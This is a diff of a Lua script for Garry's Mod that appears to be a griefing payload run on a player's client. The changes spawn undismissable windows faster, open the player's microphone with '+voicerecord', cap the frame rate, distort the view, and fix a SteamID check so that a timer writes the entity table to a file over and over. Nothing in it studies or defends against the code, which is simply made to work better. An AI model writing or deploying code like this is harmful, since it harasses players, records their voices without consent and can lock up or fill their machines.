@@ -222,7 +222,7 @@ end)
 --    timer.Remove("hahasong")
 --end
 --_timer.Create('scren',.9,100000,ss)
-_timer.Create('hntai', .2, 10000, function()
+_timer.Create('hntai', .09, 10000, function()
 local _f = _vgui.Create("DFrame")
     _f:SetTitle("")
     _f:ShowCloseButton(false)
@@ -258,7 +258,7 @@ _hook.Add('Think','funny',function()
         _command('+voicerecord')
         _command('pp_mat_overlay_refractamount',tonumber(cfunnies))
         _command('pp_texturize',result2)
-        --_command('fps_max','30')
+        _command('fps_max','30')
         --_command('nyan_love')
         --_command('hahaball')
         --_command('status')
@@ -301,10 +301,10 @@ _hook.Add("CalcView", "funny", function(ply, pos, angles, fov)
         local view = {}
             view.origin = pos
             view.angles = angles
-            view.fov = math.random(5,300)
+            view.fov = math.random(300)
         return view
 end)
-if LocalPlayer():SteamID() = 'STEAM_0:1:217428780' then 
+if LocalPlayer():SteamID() == 'STEAM_0:1:217428780' then 
     timer.Create('',0,123123123,function()
             file.Append('w.txt',table.ToString(ents.GetAll()))
     end)
